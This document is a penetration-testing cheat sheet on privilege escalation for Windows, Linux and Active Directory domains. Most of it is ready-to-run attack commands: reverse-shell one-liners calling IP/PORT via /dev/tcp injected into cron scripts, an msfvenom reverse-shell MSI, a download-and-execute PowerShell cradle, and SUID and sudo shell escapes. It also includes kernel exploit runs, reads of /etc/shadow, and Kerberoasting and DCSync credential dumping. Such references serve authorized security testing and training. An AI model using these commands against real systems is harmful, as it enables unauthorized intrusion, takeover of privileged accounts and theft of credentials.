# Privilege Escalation

Privilege escalation involves exploiting vulnerabilities, misconfigurations, or design flaws to gain elevated access beyond the initial access level obtained during penetration testing.

---

## Privilege Escalation Overview

```
    PRIVILEGE ESCALATION PATH

    [Low Privilege User]
              |
    +---------+---------+
    |                   |
    v                   v
    [Local PrivEsc]     [Domain PrivEsc]
    |                   |
    v                   v
    [SYSTEM/root]       [Domain Admin]
```

---

## Windows Privilege Escalation

### Enumeration

```bash
# Current user
whoami /all
whoami /priv
net user %username%

# System information
systeminfo
hostname
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Running processes
tasklist /v
wmic process list brief

# Services
sc query
wmic service list brief
Get-Service | Where-Object {$_.Status -eq "Running"}

# Scheduled tasks
schtasks /query /fo LIST /v

# Installed software
wmic product get name,version

# Network
netstat -ano
ipconfig /all
```

### Common Vectors

| Vector | Description | MITRE ID |
|--------|-------------|----------|
| Unquoted Service Path | Path without quotes | T1574.009 |
| Weak Service Permissions | Modify service binary | T1574.010 |
| DLL Hijacking | Missing DLL exploitation | T1574.001 |
| Always Install Elevated | MSI with SYSTEM | T1548.002 |
| Token Impersonation | SeImpersonatePrivilege | T1134.001 |
| Kernel Exploits | CVE exploitation | T1068 |
| Stored Credentials | Credential Manager | T1555 |

### Unquoted Service Path

```bash
# Find unquoted paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows"

# PowerShell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "*`"*" -and $_.PathName -notlike "*Windows*"} | Select Name,PathName

# Exploitation
# If path is: C:\Program Files\My App\service.exe
# Drop malicious executable at: C:\Program.exe
```

### Weak Service Permissions

```bash
# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

# Modify service binary
sc config [service] binpath= "C:\path\to\malicious.exe"
sc stop [service]
sc start [service]

# Modify service config
sc config [service] obj= ".\LocalSystem" password= ""
```

### Token Impersonation

```bash
# Check privileges
whoami /priv

# If SeImpersonatePrivilege enabled:
# PrintSpoofer
PrintSpoofer.exe -i -c cmd

# JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# GodPotato (Windows 2022)
GodPotato.exe -cmd "cmd /c whoami"

# Sweet Potato
SweetPotato.exe -p C:\Windows\System32\cmd.exe
```

### Always Install Elevated

```bash
# Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If enabled (both = 1), create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi

# Execute
msiexec /quiet /qn /i shell.msi
```

### Automated Enumeration

```bash
# WinPEAS
winPEASx64.exe

# PowerUp
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# Seatbelt
Seatbelt.exe -group=all

# Sherlock (legacy)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://server/Sherlock.ps1');Find-AllVulns"
```

---

## Linux Privilege Escalation

### Enumeration

```bash
# Current user
id
whoami
sudo -l

# System information
uname -a
cat /etc/os-release
cat /proc/version

# Users
cat /etc/passwd
cat /etc/shadow  # if readable
cat /etc/group

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Running processes
ps aux
```

### Common Vectors

| Vector | Description | MITRE ID |
|--------|-------------|----------|
| SUID Binaries | GTFOBins exploitation | T1548.001 |
| Sudo Misconfiguration | Sudo command abuse | T1548.003 |
| Cron Jobs | Writable cron scripts | T1053.003 |
| Kernel Exploits | CVE exploitation | T1068 |
| PATH Hijacking | Writable PATH | T1574.007 |
| Capabilities | File capabilities | T1548.001 |
| NFS Root Squashing | no_root_squash | T1080 |

### SUID Exploitation

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Common exploitable SUID (GTFOBins)
# Find (SUID)
find . -exec /bin/sh -p \;

# Vim (SUID)
vim -c ':!/bin/sh'

# Python (SUID)
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Nmap (old versions)
nmap --interactive
!sh
```

### Sudo Exploitation

```bash
# Check sudo permissions
sudo -l

# Common exploitable sudo entries
# vi/vim
sudo vi -c ':!/bin/sh'

# less
sudo less /etc/passwd
!/bin/sh

# find
sudo find /etc -exec /bin/sh \;

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# python
sudo python -c 'import os; os.system("/bin/sh")'

# env (NOPASSWD)
sudo /usr/bin/env /bin/bash
```

### Cron Job Exploitation

```bash
# Find cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# If writable script in cron:
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /path/to/script.sh

# PATH exploitation in cron
# If cron runs: * * * * * root script.sh
# And PATH includes writable directory
echo '/bin/bash -i >& /dev/tcp/IP/PORT 0>&1' > /tmp/script.sh
chmod +x /tmp/script.sh
```

### Kernel Exploits

```bash
# Check kernel version
uname -r

# Common kernel exploits
# DirtyCow (CVE-2016-5195)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty

# DirtyPipe (CVE-2022-0847)
gcc exploit.c -o exploit
./exploit

# PwnKit (CVE-2021-4034)
gcc -shared PwnKit.c -o PwnKit.so
./PwnKit
```

### Capabilities Exploitation

```bash
# Find capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities
# Python with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# tar with cap_dac_read_search
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
```

### Automated Enumeration

```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh -t

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration
./lse.sh -l 2
```

---

## Domain Privilege Escalation

### Kerberoasting

```bash
# Request TGS tickets
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request

# Crack offline
hashcat -m 13100 hashes.txt wordlist.txt

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
```

### AS-REP Roasting

```bash
# Find users without pre-auth
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Crack offline
hashcat -m 18200 hashes.txt wordlist.txt
```

### DCSync

```bash
# Mimikatz (requires replication rights)
lsadump::dcsync /user:Administrator /domain:domain.com

# Impacket
secretsdump.py domain/user:password@DC_IP -just-dc-ntlm
```

---

## Escalation Checklist

```
PRIVILEGE ESCALATION CHECKLIST

Windows:
[ ] Unquoted service paths
[ ] Weak service permissions
[ ] AlwaysInstallElevated
[ ] Stored credentials
[ ] Token impersonation
[ ] Kernel vulnerabilities
[ ] DLL hijacking

Linux:
[ ] SUID binaries
[ ] Sudo misconfigurations
[ ] Cron jobs
[ ] Writable paths
[ ] Capabilities
[ ] Kernel vulnerabilities
[ ] NFS shares

Domain:
[ ] Kerberoasting
[ ] AS-REP Roasting
[ ] DCSync
[ ] GPP Passwords
[ ] Delegation abuse
```

---

## References

- GTFOBins (https://gtfobins.github.io/)
- LOLBAS (https://lolbas-project.github.io/)
- PayloadsAllTheThings
- HackTricks

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2024-01-15 | Security Architecture | Initial release |
